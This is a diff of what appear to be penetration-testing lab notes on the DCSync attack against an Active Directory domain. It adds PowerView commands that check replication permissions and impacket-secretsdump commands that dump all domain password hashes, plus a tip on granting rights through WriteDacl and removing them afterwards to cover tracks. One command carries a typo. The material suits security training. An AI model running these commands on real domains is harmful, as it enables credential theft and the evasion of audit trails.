@@ -64,9 +64,26 @@ DCSync is a technique for stealing the Active Directory password database by usi
 
 To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
 
-    impacket-secretsdupm -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>:<password>@<dc_ip>
+If we had certain rights over the user (such as WriteDacl), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.
 
-    impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty:Sup3rS3cur3D0m@inU2eR@DC01.INLANEFREIGHT.LOCAL
+ACL permissions required:
+
+    DS-Replication-Get-Changes
+    DS-Replication-Get-Changes-All
+
+Check if a user has this permissions:
+
+    first get the user sid:
+
+    Get-DomainUser -Identity <sam_account_name> |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+    $sid = "<user_sid>"
+
+    Get-ObjectAcl "DC=<domain_name>,DC=<domain_name>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+Execute the attack:
+
+    impacket-secretsdupm -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>:<password>@<dc_ip>
+    impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty:password1!@DC01.INLANEFREIGHT.LOCAL
 
     or with mimikatz
 
